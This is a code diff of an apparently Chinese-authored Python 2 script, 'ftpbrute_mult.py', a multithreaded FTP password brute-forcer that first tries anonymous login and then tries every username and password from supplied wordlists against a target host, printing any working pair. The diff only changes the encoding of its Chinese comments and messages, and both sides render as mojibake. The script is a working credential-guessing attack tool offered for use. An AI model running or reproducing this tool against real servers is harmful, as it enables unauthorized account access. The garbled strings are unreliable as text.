@@ -2,8 +2,8 @@
 # -*- coding: gbk -*-
 # -*- coding: utf_8 -*-
 # Date: 2014/9/5
-# Created by ¶À×ÔµÈ´ı
-# ²©¿Í http://www.waitalone.cn/
+# Created by ç‹¬è‡ªç­‰å¾…
+# åšå®¢ http://www.waitalone.cn/
 from threading import Thread
 import ftplib, socket
 import sys, time, re
@@ -11,29 +11,29 @@ import sys, time, re
 
 def usage():
     print '+' + '-' * 50 + '+'
-    print '\t    Python FTP±©Á¦ÆÆ½â¹¤¾ß¶àÏß³Ì°æ'
-    print '\t   Blog£ºhttp://www.waitalone.cn/'
-    print '\t\t Code BY£º ¶À×ÔµÈ´ı'
-    print '\t\t Time£º2014-09-05'
+    print '\t    Python FTPæš´åŠ›ç ´è§£å·¥å…·å¤šçº¿ç¨‹ç‰ˆ'
+    print '\t   Blogï¼šhttp://www.waitalone.cn/'
+    print '\t\t Code BYï¼š ç‹¬è‡ªç­‰å¾…'
+    print '\t\t Timeï¼š2014-09-05'
     print '+' + '-' * 50 + '+'
     if len(sys.argv) != 4:
-        print "ÓÃ·¨: ftpbrute_mult.py ´ıÆÆ½âµÄip/domain ÓÃ»§ÃûÁĞ±í ×ÖµäÁĞ±í"
-        print "ÊµÀı: ftpbrute_mult.py www.waitalone.cn user.txt pass.txt"
+        print "ç”¨æ³•: ftpbrute_mult.py å¾…ç ´è§£çš„ip/domain ç”¨æˆ·ååˆ—è¡¨ å­—å…¸åˆ—è¡¨"
+        print "å®ä¾‹: ftpbrute_mult.py www.waitalone.cn user.txt pass.txt"
         sys.exit()
 
 
 def brute_anony():
     try:
-        print '[+] ²âÊÔÄäÃûµÇÂ½¡­¡­\n'
+        print '[+] æµ‹è¯•åŒ¿åç™»é™†â€¦â€¦\n'
         ftp = ftplib.FTP()
         ftp.connect(host, 21, timeout=10)
-        print 'FTPÏûÏ¢: %s \n' % ftp.getwelcome()
+        print 'FTPæ¶ˆæ¯: %s \n' % ftp.getwelcome()
         ftp.login()
         ftp.retrlines('LIST')
         ftp.quit()
-        print '\n[+] ÄäÃûµÇÂ½³É¹¦¡­¡­\n'
+        print '\n[+] åŒ¿åç™»é™†æˆåŠŸâ€¦â€¦\n'
     except ftplib.all_errors:
-        print '\n[-] ÄäÃûµÇÂ½Ê§°Ü¡­¡­\n'
+        print '\n[-] åŒ¿åç™»é™†å¤±è´¥â€¦â€¦\n'
 
 
 def brute_users(user, pwd):
@@ -43,7 +43,7 @@ def brute_users(user, pwd):
         ftp.login(user, pwd)
         ftp.retrlines('LIST')
         ftp.quit()
-        print '\n[+] ÆÆ½â³É¹¦£¬ÓÃ»§Ãû£º%s ÃÜÂë£º%s\n' % (user, pwd)
+        print '\n[+] ç ´è§£æˆåŠŸï¼Œç”¨æˆ·åï¼š%s å¯†ç ï¼š%s\n' % (user, pwd)
     except ftplib.all_errors:
         pass
 
@@ -57,11 +57,11 @@ if __name__ == '__main__':
         host = socket.gethostbyname(sys.argv[1])
     userlist = [i.rstrip() for i in open(sys.argv[2])]
     passlist = [j.rstrip() for j in open(sys.argv[3])]
-    print 'Ä¿  ±ê£º%s \n' % sys.argv[1]
-    print 'ÓÃ»§Ãû£º%d Ìõ\n' % len(userlist)
-    print 'ÃÜ  Âë£º%d Ìõ\n' % len(passlist)
+    print 'ç›®  æ ‡ï¼š%s \n' % sys.argv[1]
+    print 'ç”¨æˆ·åï¼š%d æ¡\n' % len(userlist)
+    print 'å¯†  ç ï¼š%d æ¡\n' % len(passlist)
     brute_anony()
-    print '\n[+] ±©Á¦ÆÆ½â²âÊÔÖĞ¡­¡­\n'
+    print '\n[+] æš´åŠ›ç ´è§£æµ‹è¯•ä¸­â€¦â€¦\n'
     thrdlist = []
     for user in userlist:
         for pwd in passlist:
@@ -71,4 +71,4 @@ if __name__ == '__main__':
             time.sleep(0.009)
     for x in thrdlist:
         x.join()
-    print '[+] ÆÆ½âÍê³É£¬ÓÃÊ±£º %d Ãë' % (time.time() - start_time)
+    print '[+] ç ´è§£å®Œæˆï¼Œç”¨æ—¶ï¼š %d ç§’' % (time.time() - start_time)
